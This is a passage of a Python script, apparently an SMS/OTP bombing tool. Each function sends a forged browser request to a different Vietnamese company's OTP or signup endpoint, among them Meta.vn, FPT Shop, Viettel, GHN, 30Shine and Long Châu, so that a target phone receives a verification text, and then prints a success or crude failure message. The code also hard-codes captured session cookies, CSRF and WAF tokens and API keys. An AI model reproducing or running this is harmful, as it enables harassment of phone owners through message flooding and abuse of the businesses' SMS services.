        print("DIENMAYXANH | TRẠNG THÁI : Thất Bại Fuck")



def meta(phone):
    cookies = {
        '_ssid': 'kfeiac30ctlo2jkxrl4b2gls',
        '__ckref': 'performance-sale',
        '_cart_': '0ea51858-1f80-4165-8840-74939d5e3d75',
        '__ckmid': '0e43463633164e028245b4bf873328d6',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '_ssid=kfeiac30ctlo2jkxrl4b2gls; __ckref=performance-sale; _cart_=0ea51858-1f80-4165-8840-74939d5e3d75; __ckmid=0e43463633164e028245b4bf873328d6',
        'origin': 'https://meta.vn',
        'priority': 'u=1, i',
        'referer': 'https://meta.vn/account/register?ReturnUrl=/account/history',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'api_mode': '1',
    }

    json_data = {
        'api_args': {
            'lgUser': phone,
            'type': 'phone',
        },
        'api_method': 'CheckRegister',
    }

    try:
        response = requests.post(
            'https://meta.vn/app_scripts/pages/AccountReact.aspx',
            params=params,
            cookies=cookies,
            headers=headers,
            json=json_data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("META | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("META | TRẠNG THÁI : Thất Bại Fuck")



def thefaceshop(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': 'cf709515be3685bb734f1c6bcb30bffc',
        'origin': 'https://thefaceshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://thefaceshop.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721530092656',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': phone,
    }

    try:
        response = requests.post(
            'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THEFACESHOP | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("THEFACESHOP | TRẠNG THÁI : Thất Bại Fuck")



def bestexpress(phone):
    headers = {
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Origin': 'https://best-inc.vn',
        'Referer': 'https://best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    params = {
        'code': 'fc9da32a48e6298d54a7a81dbbbcff50',
        'instanceId': '4fc17ac7-654b-406a-847b-efc9b7171ffa',
        'validate': '921c7b9ec5502202ec88625cb96b913e',
    }

    json_data = {
        'phoneNumber': phone,
        'verificationCodeType': 1,
    }

    try:
        response = requests.post('https://v9-cc.800best.com/uc/account/sendSignUpCode', params=params, headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BESTEXPRESS | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("BESTEXPRESS | TRẠNG THÁI : Thất Bại Fuck")



def ghnexpress(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'priority': 'u=1, i',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': phone,
        'type': 'register',
    }

    try:
        response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GHNEXPRESS | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("GHNEXPRESS | TRẠNG THÁI : Thất Bại Fuck")



def myviettel(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    }

    try:
        response = requests.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={phone}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers=headers,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MYVIETTEL | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("MYVIETTEL | TRẠNG THÁI : Thất Bại Fuck")



def fptshop(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://fptshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptshop.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'phoneNumber': phone,
    }

    try:
        response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTSHOP | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("FPTSHOP | TRẠNG THÁI : Thất Bại Fuck")



def sapo(phone):
    cookies = {
        'campaign': 'header_app_sapo',
        'referral': 'https://apps.sapo.vn/',
        'G_ENABLED_IDPS': 'google',
        'landing_page': 'https://www.sapo.vn/',
        'start_time': '07/21/2024 12:21:30',
        'pageview': '1',
        'source': 'https://www.sapo.vn/',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'campaign=header_app_sapo; referral=https://apps.sapo.vn/; G_ENABLED_IDPS=google; landing_page=https://www.sapo.vn/; start_time=07/21/2024 12:21:30; pageview=1; source=https://www.sapo.vn/',
        'origin': 'https://www.sapo.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.sapo.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        'phonenumber': phone,
    }

    try:
        response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SAPO | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("SAPO | TRẠNG THÁI : Thất Bại Fuck")



def paynet(phone):
    cookies = {
        '__RequestVerificationToken': 'LM7AlXTmKrjc0v16MMmt2qViZj8BIxkEyLcleS9vHijnP2kbDqJ3fWvJW2t_ecMjOgQiKmyDfITsH7270Y_w2UC_aaFnO1EZFjnbU8hGCZM1',
        'ASP.NET_SessionId': 'a50onuvzqyt4onxiosf1xnqo',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '__RequestVerificationToken=LM7AlXTmKrjc0v16MMmt2qViZj8BIxkEyLcleS9vHijnP2kbDqJ3fWvJW2t_ecMjOgQiKmyDfITsH7270Y_w2UC_aaFnO1EZFjnbU8hGCZM1; ASP.NET_SessionId=a50onuvzqyt4onxiosf1xnqo',
        'Origin': 'https://merchant.paynetone.vn',
        'Referer': 'https://merchant.paynetone.vn/User/Create',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'MobileNumber': phone,
        'IsForget': 'N',
    }

    try:
        response = requests.post('https://merchant.paynetone.vn/User/GetOTP', cookies=cookies, headers=headers, data=data, verify=False, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PAYNET | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("PAYNET | TRẠNG THÁI : Thất Bại Fuck")



def reebok(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '0134f9fc8e5bb3de6352617eacc195a2',
        'origin': 'https://reebok.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://reebok.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721548395723',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': phone,
    }

    try:
        response = requests.post(
            'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("REEBOK | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("REEBOK | TRẠNG THÁI : Thất Bại Fuck")



def gapowork(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://www.gapowork.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.gapowork.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-gapo-lang': 'vi',
    }

    json_data = {
        'phone_number': phone,
        'device_id': '726d8613-ca37-46bd-b7af-1b79c102c0cd',
        'device_model': 'web',
    }

    try:
        response = requests.post('https://api.gapowork.vn/auth/v3.1/signup', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GAPOWORK | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("GAPOWORK | TRẠNG THÁI : Thất Bại Fuck")



def shine(phone):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'origin': 'https://30shine.com',
        'priority': 'u=1, i',
        'referer': 'https://30shine.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': phone,
    }

    try:
        response = requests.post(
            'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
            headers=headers,
            json=json_data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("30SHINE | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("30SHINE | TRẠNG THÁI : Thất Bại Fuck")



def oreka(phone):
    cookies = {
        '__ork_u': '',
        '__ork_u_idt': '',
        '__ork_u_ph': '',
        'AWSALB': 'SFy9XJT7BhxUFBQ4oATejB5SWs7nFi4yKRr1XGUtyZt7hSmtm3VussWVf+8BHytuZUo4q6vpBbIOD79a4yOsdIXUWFx7fSfAUj0TUsaiB2hf0xr/RYavWSZxYrnK/8ghyF2Clg+zAw9nQfn7eCzjcQfgYpV+wF56nQ3sr/UCvjDwvKVc5B6ev/lq6ipVng==',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        # 'cookie': '__ork_u=; __ork_u_idt=; __ork_u_ph=; AWSALB=SFy9XJT7BhxUFBQ4oATejB5SWs7nFi4yKRr1XGUtyZt7hSmtm3VussWVf+8BHytuZUo4q6vpBbIOD79a4yOsdIXUWFx7fSfAUj0TUsaiB2hf0xr/RYavWSZxYrnK/8ghyF2Clg+zAw9nQfn7eCzjcQfgYpV+wF56nQ3sr/UCvjDwvKVc5B6ev/lq6ipVng==',
        'origin': 'https://www.oreka.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.oreka.vn/login',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-by-platform': 'PC_WEB',
    }

    json_data = {
        'variables': {
            'phone': phone,
            'locale': 'vi',
        },
        'query': 'mutation ($phone: String!, $locale: String!) {  sendVerifyPhoneApp(phone: $phone, locale: $locale)}',
    }

    try:
        response = requests.post('https://www.oreka.vn/graphql', cookies=cookies, headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("OREKA | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("OREKA | TRẠNG THÁI : Thất Bại Fuck")



def fmstyle(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://fm.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://fm.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
        'x-emp': '',
        'x-fromweb': 'true',
        'x-requestid': '862aab0f-2da0-4ea4-9e3d-358f619a2ad2',
    }

    json_data = {
        'Phone': phone,
        'LatOfMap': '106',
        'LongOfMap': '108',
        'Browser': '',
    }

    try:
        response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FMSTYLE | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("FMSTYLE | TRẠNG THÁI : Thất Bại Fuck")



def circa(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN',
        'authorization': '',
        'content-type': 'application/json',
        'grpc-timeout': '30S',
        'origin': 'https://circa.vn',
        'priority': 'u=1, i',
        'referer': 'https://circa.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': {
            'country_code': '84',  # Giả sử mã quốc gia là '84'
            'phone_number': phone[1:],  # Lấy phần còn lại của số điện thoại
        },
    }

    try:
        response = requests.post('https://api.circa.vn/v1/entity/validation-phone', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("CIRCA | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("CIRCA | TRẠNG THÁI : Thất Bại Fuck")



def acfc(phone):
    cookies = {
        'form_key': 'NAeTVepv8jfDGFEt',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'optiMonkClientId': '031e2e37-cd11-5d7f-bdd8-87671934b9a6',
        'optiMonkSession': '1721551346',
        'PHPSESSID': 'km715lglu45ngr7e6ubngf6f1a',
        'form_key': 'NAeTVepv8jfDGFEt',
        'private_content_version': 'd62e46921486bf21498614890d7e6251',
        'mgn_location_popup': 'southern',
        'X-Magento-Vary': '1dedfea16bd448ed11649def077bf655f8a6a95b3f3e1f559074febbe59693fc',
        'mage-cache-sessid': 'true',
        'aws-waf-token': '9ebe372d-9bac-4629-89bf-6c56fe46a184:BgoAlfE7etEyAgAA:Ov9qItJghL7JQES9NLNAtRsyuwLwfsrDWAWFXrzsZxChcKixFyRmyEVRlWBD9hO05D/g9IY+VVeV/lGsgZjEbVvzkuHAUQ9JNL/Yk16tCF1cAiLOQsoz5da1YgVsfqd/Rifxg/HRrA/PeiSv9022XH5JQN92MwBlN2/Zlwea9A+n7vBiarulYu5vWdtUpl4Que2B5ZhkfeN6sJH26VrQWJagIzZLzBq4bBfpu8KWmRMEmhYN9wEKAQ==',
        'optiMonkClient': 'N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCZIIwBmAFgjwBtjEzKJqaJY8A7APYAHVjSxYgA=',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=NAeTVepv8jfDGFEt; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; optiMonkClientId=031e2e37-cd11-5d7f-bdd8-87671934b9a6; optiMonkSession=1721551346; PHPSESSID=km715lglu45ngr7e6ubngf6f1a; form_key=NAeTVepv8jfDGFEt; private_content_version=d62e46921486bf21498614890d7e6251; mgn_location_popup=southern; X-Magento-Vary=1dedfea16bd448ed11649def077bf655f8a6a95b3f3e1f559074febbe59693fc; mage-cache-sessid=true; aws-waf-token=9ebe372d-9bac-4629-89bf-6c56fe46a184:BgoAlfE7etEyAgAA:Ov9qItJghL7JQES9NLNAtRsyuwLwfsrDWAWFXrzsZxChcKixFyRmyEVRlWBD9hO05D/g9IY+VVeV/lGsgZjEbVvzkuHAUQ9JNL/Yk16tCF1cAiLOQsoz5da1YgVsfqd/Rifxg/HRrA/PeiSv9022XH5JQN92MwBlN2/Zlwea9A+n7vBiarulYu5vWdtUpl4Que2B5ZhkfeN6sJH26VrQWJagIzZLzBq4bBfpu8KWmRMEmhYN9wEKAQ==; optiMonkClient=N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCZIIwBmAFgjwBtjEzKJqaJY8A7APYAHVjSxYgA=',
        'origin': 'https://www.acfc.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.acfc.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'number_phone': phone,
        'form_key': 'NAeTVepv8jfDGFEt',
        'currentUrl': 'https://www.acfc.com.vn/customer/account/create/',
    }

    try:
        response = requests.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ACFC | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("ACFC | TRẠNG THÁI : Thất Bại Fuck")



def fptlongchauzl(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-channel': 'EStore',
    }

    json_data = {
        'phoneNumber': phone,
        'otpType': 1,
        'fromSys': 'WEBKHLC',
    }

    try:
        response = requests.post(
            'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
            headers=headers,
            json=json_data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTLONGCHAUZL | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("FPTLONGCHAUZL | TRẠNG THÁI : Thất Bại Fuck")



def thuocsi(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://thuocsi.vn',
        'priority': 'u=1, i',
        'referer': 'https://thuocsi.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-request-id': '1721576026076',
        'x-request-path': '/marketplace/customer/v1/register',
    }

    json_data = {
        'scope': 'DENTISTRY',
        'businessName': 'Nha khoa',
        'address': '53 et 3',
        'provinceCode': '95',
        'districtCode': '958',
        'wardCode': '31912',
        'phone': phone,
        'referCode': '',
        'isNewFlow': True,
        'verificationCode': '',
    }

    try:
        response = requests.post('https://v2api.thuocsi.vn/marketplace/customer/v1/register', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THUOCSI | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("THUOCSI | TRẠNG THÁI : Thất Bại Fuck")



def pantio(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://pantio.vn',
        'priority': 'u=1, i',
        'referer': 'https://pantio.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'domain': 'pantiofashion.myharavan.com',
    }

    data = {
        'phoneNumber': phone,
    }

    try:
        response = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', params=params, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PANTIO | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("PANTIO | TRẠNG THÁI : Thất Bại Fuck")



def pantioresend(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://pantio.vn',
        'priority': 'u=1, i',
        'referer': 'https://pantio.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
